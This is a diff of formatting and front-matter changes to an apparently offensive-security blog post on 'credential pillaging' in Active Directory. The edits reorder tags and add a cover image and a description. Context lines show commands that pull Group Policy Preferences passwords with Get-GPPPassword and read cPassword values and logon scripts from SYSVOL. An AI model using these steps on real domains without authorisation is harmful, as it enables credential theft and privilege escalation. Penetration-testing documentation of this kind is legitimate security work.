@@ -1,16 +1,15 @@
 ---
 title: Credential Pillaging
 date: 2026-06-30 16:45:53
+
 categories:
   - Active Directory
   - Exploitation
   - Credential Pillaging
+
 tags:
-  - PowerView
-  - Privilege-Escalation
   - Windows
   - Active-Directory
-  - NetExec
   - Credential-Pillaging
   - Credential-Access
   - GPP
@@ -20,6 +19,8 @@ tags:
   - Logon-Scripts
   - Get-GPPPassword
   - gpp-decrypt
+  - NetExec
+  - PowerView
   - Active-Directory-Attributes
   - User-Descriptions
   - ADIDNSDump
@@ -28,7 +29,14 @@ tags:
   - GPO-Abuse
   - SharpGPOAbuse
   - pyGPOAbuse
+  - Privilege-Escalation
+
+cover: /img/credential-pillaging.png
+top_img: /img/bg-img.jpg
+description: Learn how to recover credentials from Group Policy Preferences (GPP), SYSVOL logon scripts, and Active Directory attributes, then identify and abuse misconfigured Group Policy Objects (GPOs) to escalate privileges.
 ---
+
+
 
 > ➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.
 
@@ -63,19 +71,17 @@ Import-Module .\Get-GPPPassword.ps1
 ```
 
 > Retrieve GPP Passwords with Get-GPPPassword
-
 ```powershell
 Get-GPPPassword
 ```
 
 #### Manual Retrieval
 
-> Browse a policy’s Preferences directory to find a `Groups.xml` file containing a `cPassword`.
+> Browse a policy's Preferences directory to find a `Groups.xml` file containing a `cPassword`.
 
 ```powershell
 cat \\<DC>\SYSVOL\<DOMAIN>\Policies\<GUID>\Machine\Preferences\Groups\Groups.xml
 ```
-
 > Decrypt a GPP cPassword
 
 ```bash
@@ -101,6 +107,7 @@ cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<SCRIPT>
 ## Credentials Stored in Active Directory
 
 > ➜ Administrators sometimes store passwords or other sensitive information directly in Active Directory user attributes.
+
 
 > Import PowerView
 
